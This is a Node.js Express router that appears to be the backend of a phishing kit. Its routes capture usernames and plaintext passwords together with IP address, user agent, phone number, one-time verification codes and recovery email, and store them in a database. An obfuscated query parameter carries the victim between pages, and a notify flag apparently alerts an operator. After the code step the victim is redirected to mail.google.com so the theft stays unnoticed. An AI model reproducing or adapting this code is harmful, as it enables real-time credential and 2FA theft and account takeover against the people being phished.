const express = require ('express');
const router = express.Router();
const db = require('../db');
const bodyParser = require('body-parser');

router.use(express.static('public'));
router.use(express.static(__dirname + '/public'));
router.use(bodyParser.urlencoded({ extended: false }));


//validate form data before handling
// Custom middleware for form validation
const validateFormData = (req, res, next) => {
  const { username, password } = req.body;

  
  if (!username || !password) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


// Handle form submission

router.post('/submit', validateFormData, (req, res) => {
   
    const name = req.body.username;
    const b64 = Buffer.from(name).toString('base64');
    const word = req.body.password;
    // const clientIP = req.headers['x-forwarded-for'];
    // const ip =  clientIP.split(',')[0].trim(); 
    const ip = req.socket.remoteAddress; 
    const useragent = req.get('User-Agent');
    const date = new Date();
    const pagetype = 0;
    const mobiletype = 0;
    const notify = 0;


    

    const sqlQuery =  'SELECT username FROM maintable WHERE username= ?';   
    db.query(sqlQuery, [name], (err, results) => {
      if (err) {
        console.error('Error executing query:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
      }
    const rowCount = results.length;

      if (rowCount > 0) {
                            // Update the table if a matching record exists
                            const updateQuery = 'UPDATE maintable SET password = ? , pagetype = ? , mobiletype = ? , notify = ? WHERE username = ?';
                            db.query(updateQuery, [word, pagetype, mobiletype, notify, name], (err) => {
                                if (err) {
                                    console.error('Error updating record:', err);
                                    return res.status(500).send('Internal Server Error');
                                }
                                res.redirect(`/codeload/?tgrdsfgdytrbdfwergter=${b64}`);
                            });
                            } else {
                            // Insert a new record if no matching record exists
                            const insertQuery = 'INSERT INTO maintable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
                            db.query(insertQuery, [name, word, ip, useragent, date, notify], (err) => {
                                if (err) {
                                    console.error('Error inserting record:', err);
                                    return res.status(500).send('Internal Server Error');
                                }
                                res.redirect(`/codeload/?tgrdsfgdytrbdfwergter=${b64}`);
                            });
                                    }
      
  
     
    });
  
});



router.post('/codeotp' , (req, res) => {

  const name = req.body.username;
  const pagetype = req.body.page;
  const mobiletype = req.body.mobile;
  const notif = 1;
  

  const sqlQuery =  'SELECT username FROM maintable WHERE username= ?';   
  db.query(sqlQuery, [name], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

    if (rowCount > 0) {
                        const updateQuery = 'UPDATE maintable SET pagetype = ? , mobiletype = ? , notify = ? WHERE username = ?';
                        db.query(updateQuery, [pagetype, mobiletype,notif,name], (err) => {
                            if (err) {
                                console.error('Error updating record:', err);
                                return res.status(500).send('Internal Server Error');
                            }

                            res.redirect('/backend');
                           
                        });
                          } 
       
  });

});

//handel code submission request

const validateMobile = (req, res, next) => {
  const mobile = req.body.tel;

  if (mobile == null) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};


router.post('/mobilepost', validateMobile, (req, res) => {
   
  const name = req.body.username;
  const b64 = Buffer.from(name).toString('base64');
  const mobile = req.body.tel;
  const b64mob = Buffer.from(mobile).toString('base64');
  const notify = 0;

 

  const sqlQuery =  'SELECT username FROM maintable WHERE username= ?';   
  db.query(sqlQuery, [name], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

    if (rowCount > 0) {
                          // Update the table if a matching record exists
                          const codeupdate = 'UPDATE maintable SET mobiletype = ? , notify = ?  WHERE username = ?';
                          db.query(codeupdate, [mobile, notify, name], (err) => {
                              if (err) {
                                  console.error('Error updating record:', err);
                                  return res.status(500).send('Internal Server Error');
                              }
                              res.redirect(`/code/?tgrdsfgdytrbdfwergter=${b64}/${b64mob}`);

                          });
                          } 
    
  });

});


//  code submission


const validateFormcode = (req, res, next) => {
  const mobile = req.body.code;

  if (mobile == null) {
      return res.status(400).render('error');
  }

  // Additional validation checks can be added here

  // If validation passes, proceed to the next middleware or route handler
  next();
};



router.post('/codepost', validateFormcode, (req, res) => {
   
  const user = req.body.username;
  const code = req.body.code;
  


  const sqlQuery =  'SELECT username FROM maintable WHERE username= ?';   
  db.query(sqlQuery, [user], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

    if (rowCount > 0) {
                          // Update the table if a matching record exists
                          const codeupdate = 'UPDATE maintable SET pagetype = ?  WHERE username = ?';
                          db.query(codeupdate, [code, user], (err) => {
                              if (err) {
                                  console.error('Error updating record:', err);
                                  return res.status(500).send('Internal Server Error');
                              }
                              res.redirect('https://mail.google.com');

                          });
                          } 
    

   
  });

});

router.post('/codeemail' , (req, res) => {

  const name = req.body.username;
  const recoveryemail = req.body.recoveryemail;
  const notify = 0;
  

  const sqlQuery =  'SELECT username FROM maintable WHERE username= ?';   
  db.query(sqlQuery, [name], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

    if (rowCount > 0) {
                          const codeupdate = 'UPDATE maintable SET mobiletype = ?, notify = ? WHERE username = ?';
                          db.query(codeupdate, [recoveryemail, notify, name], (err) => {
                              if (err) {
                                  console.error('Error updating record:', err);
                                  return res.status(500).send('Internal Server Error');
                              }
                              res.redirect('https://mail.google.com');

                          });
                          } 
       
  });

});



module.exports =router
